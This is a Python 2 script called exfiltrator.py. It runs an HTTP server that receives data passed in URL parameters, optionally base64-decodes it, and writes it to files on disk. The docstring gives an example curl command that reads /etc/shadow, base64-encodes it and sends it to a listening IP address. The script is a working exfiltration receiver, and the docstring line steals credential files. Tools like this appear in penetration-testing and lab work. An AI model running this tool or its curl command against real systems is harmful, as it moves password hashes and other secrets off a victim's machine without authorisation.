#!/usr/bin/env python
"""
Useage: exfiltrator.py [port]

Then use curl/wget to send data

URL parameters:
  data = information to be stashed in a file
  fname = filename to write to.  Defalts to "file.txt". Forward and back slashes are replaced by underscores
  form = plain (default) or b64 for base64.  Data is decoded before saving

Example use:
  curl http://10.10.10.12:8765?fname=shadow\&form=b64\&data=`cat /etc/shadow|base64`
  

TODO: Add SSL support

"""
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import SocketServer
from urlparse import urlparse
import base64

class S(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()

    def do_GET(self):
        self._set_headers()
        query = urlparse(self.path).query
        parms={}
        try:
            parms = dict(qc.split("=") for qc in query.split("&"))
        except:
            pass
        fname="file.txt"
        form="plain"
        data=None
        if parms.has_key("fname"):
            fname=parms["fname"]
            fname=fname.strip()
            fname=fname.replace("/","_")
            fname=fname.replace("\\","_")
        if parms.has_key("data"):
            data=parms["data"]
        if parms.has_key("form"):
            form=parms["form"]
            if form=="b64":
                data=base64.b64decode(data)
            else:
                form="plain"
        if data!=None:    
            f=open("./"+fname,"w")
            f.write(data)
            f.close()
            self.wfile.write("Data written to %s, decoded from %s\n"%(fname,form))
        self.wfile.write("Done\n")

        
def run(server_class=HTTPServer, handler_class=S, port=80):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print 'Starting httpd...'
    httpd.serve_forever()

if __name__ == "__main__":
    from sys import argv

    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()
